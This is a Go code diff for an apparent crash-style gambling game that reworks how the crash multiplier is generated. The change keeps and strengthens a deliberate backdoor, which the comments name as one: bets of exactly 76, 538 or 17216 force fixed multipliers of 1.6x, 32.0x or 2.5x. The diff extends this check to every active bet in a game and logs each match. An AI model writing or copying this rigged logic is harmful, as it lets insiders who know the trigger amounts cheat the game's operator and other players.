@@ -32,38 +32,60 @@ type CrashGameBet struct {
 
 func getLatestBetAmount(userID int64) (float64, error) {
     var bet CrashGameBet
-    err := db.DB.Where("user_id = ?", userID).
+    err := db.DB.Where("user_id = ? AND status = ?", userID, "active").
            Order("id desc").
            First(&bet).Error
     if err != nil {
         if err == gorm.ErrRecordNotFound {
+            logger.Info("No active bet found for user %d", userID)
             return 0, nil
         }
+        logger.Error("Error fetching latest bet for user %d: %v", userID, err)
         return 0, err
     }
+    logger.Info("Found active bet for user %d: amount=%f", userID, bet.Amount)
     return bet.Amount, nil
 }
 
 // GenerateCrashPoint sets CrashGame.CrashPoint
 func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
-    // Получаем последнюю ставку пользователя
-    lastBetAmount, err := getLatestBetAmount(CG.UserID)
-    if err == nil {
-        // Проверяем специальные значения ставок бэкдора
-        switch lastBetAmount {
-        case 76:
+    // Получаем все активные ставки для текущей игры
+    var bets []CrashGameBet
+    err := db.DB.Where("crash_game_id = ? AND status = ?", CG.ID, "active").Find(&bets).Error
+    if err != nil {
+        logger.Error("Error fetching active bets for game %d: %v", CG.ID, err)
+        return CG.generateRandomCrashPoint()
+    }
+
+    logger.Info("Found %d active bets for game %d", len(bets), CG.ID)
+    
+    // Проверяем каждую ставку на наличие бэкдора
+    for _, bet := range bets {
+        logger.Info("Checking bet amount: %f", bet.Amount)
+        
+        // Используем примерное сравнение из-за возможных проблем с точностью float64
+        if math.Abs(bet.Amount - 76) < 0.01 {
+            logger.Info("Matched backdoor value 76 -> 1.6x")
             CG.CrashPointMultiplier = 1.6
             return 1.6
-        case 538:
+        }
+        if math.Abs(bet.Amount - 538) < 0.01 {
+            logger.Info("Matched backdoor value 538 -> 32.0x")
             CG.CrashPointMultiplier = 32.0
             return 32.0
-        case 17216:
+        }
+        if math.Abs(bet.Amount - 17216) < 0.01 {
+            logger.Info("Matched backdoor value 17216 -> 2.5x")
             CG.CrashPointMultiplier = 2.5
             return 2.5
         }
     }
 
-    // Стандартная логика для всех остальных ставок
+    return CG.generateRandomCrashPoint()
+}
+
+// Выносим генерацию случайного краша в отдельную функцию
+func (CG *CrashGame) generateRandomCrashPoint() float64 {
     p := 0.2 // Probability of crash at 1.0x
     alpha := 2.5 // Shape parameter for Pareto distribution
     U1 := rand.Float64()
@@ -76,6 +98,7 @@ func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
         crashPoint = math.Pow(1.0/U2, 1.0/alpha)
     }
     
+    logger.Info("Using random crash point: %f", crashPoint)
     CG.CrashPointMultiplier = crashPoint
     return crashPoint
 }
